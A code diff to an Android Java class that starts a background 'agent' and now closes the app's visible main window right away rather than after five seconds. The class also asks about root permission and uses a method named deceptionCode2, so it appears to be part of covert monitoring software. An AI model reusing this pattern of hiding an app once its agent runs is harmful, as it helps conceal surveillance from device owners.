@@ -142,6 +142,8 @@ public class Core extends Activity implements Runnable {
 			return false;
 		}
 
+
+
 		if (serviceRunning) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (Start): service already running"); //$NON-NLS-1$
@@ -151,7 +153,7 @@ public class Core extends Activity implements Runnable {
 			}
 			if(Cfg.GUI) {
 				Status.setIconState(true);
-
+				closeMainActivity();
 			}
 
 			/* this check is used to know if we need to ask the user for root permission */
@@ -200,6 +202,10 @@ public class Core extends Activity implements Runnable {
 				}
 			}
 			return false;
+		}else{
+			if(Cfg.GUI) {
+				closeMainActivity();
+			}
 		}
 
 
@@ -248,24 +254,30 @@ public class Core extends Activity implements Runnable {
 			Status.self().makeToast(M.e("Agent started!"));
 		}
 
-		if(Cfg.GUI){
+//		if(Cfg.GUI){
+//
+//			Status.getStpe().schedule(new Runnable() {
+//				@Override
+//				public void run() {
+//					closeMainActivity();
+//				}
+//			}, 5, TimeUnit.SECONDS);
+//
+//		}
 
-			Status.getStpe().schedule(new Runnable() {
-				@Override
-				public void run() {
-					try {
-						Status.getAppGui().finish();
-					}catch(Exception ex){
-						if (Cfg.DEBUG) {
-							Check.log(TAG + " (Start), ", ex);
-						}
-					}
-				}
-			}, 5, TimeUnit.SECONDS);
 
-		}
 
 		return true;
+	}
+
+	private void closeMainActivity() {
+		try {
+			Status.getAppGui().finish();
+		}catch(Exception ex){
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (Start), ", ex);
+			}
+		}
 	}
 
 	public static void deceptionCode2(long mersenne) {
